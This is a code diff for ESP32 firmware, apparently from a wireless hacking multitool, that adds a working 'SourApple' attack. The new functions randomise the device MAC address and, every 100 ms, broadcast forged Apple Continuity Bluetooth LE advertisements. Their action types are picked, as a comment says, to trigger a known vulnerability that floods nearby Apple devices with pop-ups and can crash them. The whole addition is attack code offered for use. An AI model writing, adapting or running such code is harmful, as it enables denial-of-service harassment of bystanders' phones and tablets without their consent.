@@ -592,3 +592,79 @@ void aj_adv(int ble_choice) { // customSet defaults to false
     delay(100);
     BLEDevice::deinit();
 }
+
+void executeSourApple() {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+    BLEDevice::init("");
+    delay(10);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    pAdvertising = BLEDevice::getAdvertising();
+
+    BLEAdvertisementData advertisementData = BLEAdvertisementData();
+
+    // Create SourApple specific packet
+    uint8_t packet[17];
+    uint8_t i = 0;
+    packet[i++] = 16;    // Packet Length
+    packet[i++] = 0xFF;  // Packet Type (Manufacturer Specific)
+    packet[i++] = 0x4C;  // Packet Company ID (Apple, Inc.)
+    packet[i++] = 0x00;  // ...
+    packet[i++] = 0x0F;  // Type
+    packet[i++] = 0x05;  // Length
+    packet[i++] = 0xC1;  // Action Flags
+
+    // Action types that trigger the SourApple vulnerability
+    const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+    packet[i++] = types[random() % sizeof(types)];  // Action Type
+
+    // Generate random authentication tag
+    esp_fill_random(&packet[i], 3);
+    i += 3;
+
+    packet[i++] = 0x00;  // Unknown field
+    packet[i++] = 0x00;  // Unknown field
+    packet[i++] = 0x10;  // Type
+
+    // Fill remaining bytes with random data
+    esp_fill_random(&packet[i], 3);
+
+    // Add data to advertisement
+    advertisementData.addData(std::string((char *)packet, 17));
+
+    // Set and start advertising
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(50);
+
+    // Stop advertising
+    pAdvertising->stop();
+    delay(10);
+    BLEDevice::deinit();
+}
+
+void sourApple() {
+    int count = 0;
+    int timer = millis();
+
+    while (1) {
+        if (millis() - timer > 100) {
+            displayTextLine("SourApple Attack (" + String(count) + ")");
+            executeSourApple();
+            count++;
+            timer = millis();
+        }
+
+        if (check(EscPress)) {
+            returnToMenu = true;
+            break;
+        }
+    }
+
+    BLEDevice::init("");
+    delay(100);
+    pAdvertising = nullptr;
+    delay(100);
+    BLEDevice::deinit();
+}
